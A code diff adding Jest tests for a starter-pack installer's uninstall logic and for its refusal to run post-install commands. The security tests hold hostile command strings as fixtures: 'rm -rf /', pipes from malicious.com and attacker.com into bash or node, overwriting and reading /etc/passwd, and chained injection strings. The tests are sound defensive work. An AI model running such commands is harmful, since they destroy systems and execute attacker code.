@@ -183,11 +183,322 @@ describe("PackInstaller", () => {
   });
 
   describe("uninstallPack", () => {
+    beforeEach(async () => {
+      // Install a pack first for uninstallation tests
+      await installer.installPack(mockValidPack, packSource);
+    });
+
     it("should return failure for non-existent pack", async () => {
+      const result = await installer.uninstallPack("non-existent-pack");
+
+      expect(result.success).toBe(false);
+      expect(result.errors).toContain("Pack 'non-existent-pack' is not installed");
+    });
+
+    it("should successfully uninstall an installed pack with manifest available", async () => {
+      const result = await installer.uninstallPack("test-pack");
+
+      expect(result.success).toBe(true);
+      expect(result.installed.modes).toContain("engineer");
+      expect(result.installed.workflows).toContain("review");
+      expect(result.installed.agents).toContain("claude-code-research");
+
+      // Verify files were removed
+      expect(await fs.exists(`${mockProjectRoot}/.zcc/modes/engineer.md`)).toBe(false);
+      expect(await fs.exists(`${mockProjectRoot}/.zcc/workflows/review.md`)).toBe(false);
+      expect(await fs.exists(`${mockProjectRoot}/.claude/agents/claude-code-research.md`)).toBe(false);
+
+      // Verify pack was removed from project manifest
+      expect(await fs.exists(`${mockProjectRoot}/.zcc/packs.json`)).toBe(true);
+      const manifestContent = await fs.readFile(`${mockProjectRoot}/.zcc/packs.json`, 'utf-8') as string;
+      const manifest = JSON.parse(manifestContent);
+      expect(manifest.packs["test-pack"]).toBeUndefined();
+    });
+
+    it("should handle pack uninstallation when manifest source is unavailable", async () => {
+      // Remove the original pack template to simulate unavailable manifest
+      await fs.unlink('/test/templates/starter-packs/test-pack/manifest.json');
+
+      const result = await installer.uninstallPack("test-pack");
+
+      // Should still succeed but use fallback scanning approach
+      expect(result.success).toBe(false); // False due to scanning mode error message
+      expect(result.errors.some(error => 
+        error.includes("Pack manifest not available")
+      )).toBe(true);
+      
+      // Components should be skipped in scanning mode for safety
+      expect(result.skipped.modes.length + result.skipped.workflows.length + result.skipped.agents.length).toBeGreaterThan(0);
+    });
+
+    it("should clean up pack configuration during uninstallation", async () => {
+      // Install pack with configuration
+      const packWithConfig: PackStructure = {
+        ...mockValidPack,
+        manifest: {
+          ...mockValidPack.manifest,
+          configuration: {
+            defaultMode: "engineer",
+            projectSettings: {
+              theme: "dark",
+              enableAnalytics: false
+            }
+          }
+        }
+      };
+
+      await installer.installPack(packWithConfig, packSource, { force: true });
+
+      // Verify configuration was written
+      expect(await fs.exists(`${mockProjectRoot}/.zcc/config.json`)).toBe(true);
+      const configBefore = JSON.parse(await fs.readFile(`${mockProjectRoot}/.zcc/config.json`, 'utf-8') as string);
+      expect(configBefore.theme).toBe("dark");
+      expect(configBefore.defaultMode).toBe("engineer");
+
+      // Update the pack source to include the config
+      await fs.writeFile('/test/templates/starter-packs/test-pack/manifest.json', JSON.stringify(packWithConfig.manifest));
+
+      // Uninstall the pack
+      const result = await installer.uninstallPack("test-pack");
+
+      expect(result.success).toBe(true);
+
+      // Verify configuration was cleaned up
+      const configAfter = JSON.parse(await fs.readFile(`${mockProjectRoot}/.zcc/config.json`, 'utf-8') as string);
+      expect(configAfter.theme).toBeUndefined();
+      expect(configAfter.enableAnalytics).toBeUndefined();
+      expect(configAfter.defaultMode).toBeUndefined();
+    });
+
+    it("should handle partial failure during component removal", async () => {
+      // Mock fs.unlink to fail for one component
+      const originalUnlink = fs.unlink;
+      fs.unlink = jest.fn().mockImplementation((path: string) => {
+        if (path.includes('engineer.md')) {
+          throw new Error('Permission denied');
+        }
+        return originalUnlink.call(fs, path);
+      });
+
       const result = await installer.uninstallPack("test-pack");
 
       expect(result.success).toBe(false);
-      expect(result.errors).toContain("Pack 'test-pack' is not installed");
+      expect(result.errors.some(error => 
+        error.includes("Failed to remove mode 'engineer'")
+      )).toBe(true);
+
+      // Other components should still be removed
+      expect(result.installed.workflows).toContain("review");
+      expect(result.installed.agents).toContain("claude-code-research");
+
+      // Restore original function
+      fs.unlink = originalUnlink;
+    });
+
+    it("should handle configuration cleanup errors gracefully", async () => {
+      // Mock fs.readFile to fail when reading config
+      const originalReadFile = fs.readFile;
+      fs.readFile = jest.fn().mockImplementation((path: string, encoding?: any) => {
+        if (path.includes('config.json')) {
+          throw new Error('Config read error');
+        }
+        return originalReadFile.call(fs, path, encoding);
+      });
+
+      const result = await installer.uninstallPack("test-pack");
+
+      expect(result.success).toBe(false);
+      expect(result.errors.some(error => 
+        error.includes("Failed to clean up configuration")
+      )).toBe(true);
+
+      // Component removal should still work
+      expect(result.installed.modes).toContain("engineer");
+
+      // Restore original function
+      fs.readFile = originalReadFile;
+    });
+
+    it("should handle project manifest update errors gracefully", async () => {
+      // Mock fs.writeFile to fail when writing manifest
+      const originalWriteFile = fs.writeFile;
+      fs.writeFile = jest.fn().mockImplementation((path: string, content: string) => {
+        if (path.includes('packs.json')) {
+          throw new Error('Manifest write error');
+        }
+        return originalWriteFile.call(fs, path, content);
+      });
+
+      // Should not throw but should return error in the result
+      const result = await installer.uninstallPack("test-pack");
+      expect(result.success).toBe(false);
+      expect(result.errors.some(error => error.includes('Manifest write error'))).toBe(true);
+
+      // Restore original function
+      fs.writeFile = originalWriteFile;
+    });
+
+    it("should handle non-existent component files gracefully", async () => {
+      // Remove some component files manually before uninstalling
+      await fs.unlink(`${mockProjectRoot}/.zcc/modes/engineer.md`);
+
+      const result = await installer.uninstallPack("test-pack");
+
+      expect(result.success).toBe(true);
+      
+      // Should report that engineer mode was skipped (not found)
+      expect(result.skipped.modes).toContain("engineer");
+      
+      // Other components should still be removed
+      expect(result.installed.workflows).toContain("review");
+      expect(result.installed.agents).toContain("claude-code-research");
+    });
+
+    it("should handle empty pack components gracefully", async () => {
+      // Create a pack with no components
+      const emptyPack: PackStructure = {
+        ...mockValidPack,
+        manifest: {
+          ...mockValidPack.manifest,
+          name: "empty-pack",
+          components: {}
+        }
+      };
+
+      // Install empty pack first
+      await installer.installPack(emptyPack, packSource);
+
+      // Update the pack source to include empty pack manifest for uninstall
+      await fs.writeFile('/test/templates/starter-packs/empty-pack/manifest.json', JSON.stringify(emptyPack.manifest));
+
+      const result = await installer.uninstallPack("empty-pack");
+
+      expect(result.success).toBe(true);
+      expect(result.installed.modes).toHaveLength(0);
+      expect(result.installed.workflows).toHaveLength(0);
+      expect(result.installed.agents).toHaveLength(0);
+      expect(result.installed.hooks).toHaveLength(0);
+    });
+
+    it("should remove pack from project manifest even on component failure", async () => {
+      // Mock fs.unlink to fail for all components
+      const originalUnlink = fs.unlink;
+      fs.unlink = jest.fn().mockRejectedValue(new Error('Cannot remove files'));
+
+      const result = await installer.uninstallPack("test-pack");
+
+      expect(result.success).toBe(false);
+      expect(result.errors.length).toBeGreaterThan(0);
+
+      // Pack should still be removed from manifest
+      expect(await fs.exists(`${mockProjectRoot}/.zcc/packs.json`)).toBe(true);
+      const manifestContent = await fs.readFile(`${mockProjectRoot}/.zcc/packs.json`, 'utf-8') as string;
+      const manifest = JSON.parse(manifestContent);
+      expect(manifest.packs["test-pack"]).toBeUndefined();
+
+      // Restore original function
+      fs.unlink = originalUnlink;
+    });
+  });
+
+  describe("SECURITY: Post-install command handling", () => {
+    it("should disable post-install command execution and show security warnings", async () => {
+      const maliciousPack: PackStructure = {
+        ...mockValidPack,
+        manifest: {
+          ...mockValidPack.manifest,
+          postInstall: {
+            commands: [
+              "rm -rf /",
+              "curl malicious.com/evil.sh | bash",
+              "echo 'malicious' > /etc/passwd"
+            ],
+            message: "Run these dangerous commands!"
+          }
+        }
+      };
+
+      // Mock logger to capture warnings
+      const mockLogger = require("../../logger").logger;
+      const warnSpy = jest.spyOn(mockLogger, 'warn');
+
+      const result = await installer.installPack(maliciousPack, packSource);
+
+      // Should complete successfully but with security warnings
+      expect(result.success).toBe(true);
+      
+      // Verify security warnings were logged
+      expect(warnSpy).toHaveBeenCalledWith('⚠️  SECURITY: Post-install commands detected but disabled for security');
+      expect(warnSpy).toHaveBeenCalledWith('⚠️  Post-install commands could allow arbitrary code execution from untrusted sources');
+      expect(warnSpy).toHaveBeenCalledWith('⚠️  Found commands in manifest but they will NOT be executed:');
+      expect(warnSpy).toHaveBeenCalledWith('⚠️    - rm -rf /');
+      expect(warnSpy).toHaveBeenCalledWith('⚠️    - curl malicious.com/evil.sh | bash');
+      expect(warnSpy).toHaveBeenCalledWith('⚠️    - echo \'malicious\' > /etc/passwd');
+      expect(warnSpy).toHaveBeenCalledWith('⚠️  If you trust this pack and need these commands, run them manually');
+      expect(warnSpy).toHaveBeenCalledWith('⚠️  Never run commands from untrusted starter packs');
+
+      // Verify no actual command execution occurred (system would still be intact)
+      // This is tested implicitly by the test suite still running
+    });
+
+    it("should handle post-install commands with empty array gracefully", async () => {
+      const packWithEmptyCommands: PackStructure = {
+        ...mockValidPack,
+        manifest: {
+          ...mockValidPack.manifest,
+          postInstall: {
+            commands: [],
+            message: "No commands to run"
+          }
+        }
+      };
+
+      const result = await installer.installPack(packWithEmptyCommands, packSource);
+      expect(result.success).toBe(true);
+    });
+
+    it("should handle post-install message without commands", async () => {
+      const packWithMessageOnly: PackStructure = {
+        ...mockValidPack,
+        manifest: {
+          ...mockValidPack.manifest,
+          postInstall: {
+            message: "Please manually configure your environment"
+          }
+        }
+      };
+
+      const result = await installer.installPack(packWithMessageOnly, packSource);
+      expect(result.success).toBe(true);
+      expect(result.postInstallMessage).toBe("Please manually configure your environment");
+    });
+
+    it("should prevent command injection through post-install commands", async () => {
+      const injectionPack: PackStructure = {
+        ...mockValidPack,
+        manifest: {
+          ...mockValidPack.manifest,
+          postInstall: {
+            commands: [
+              "echo 'normal' && rm -rf /",
+              "npm install; curl attacker.com/backdoor.js | node",
+              "; cat /etc/passwd; echo 'done'"
+            ]
+          }
+        }
+      };
+
+      const mockLogger = require("../../logger").logger;
+      const warnSpy = jest.spyOn(mockLogger, 'warn');
+
+      const result = await installer.installPack(injectionPack, packSource);
+
+      expect(result.success).toBe(true);
+      
+      // Verify all malicious commands were logged but not executed
+      expect(warnSpy).toHaveBeenCalledWith('⚠️    - echo \'normal\' && rm -rf /');
+      expect(warnSpy).toHaveBeenCalledWith('⚠️    - npm install; curl attacker.com/backdoor.js | node');
+      expect(warnSpy).toHaveBeenCalledWith('⚠️    - ; cat /etc/passwd; echo \'done\'');
     });
   });
 });
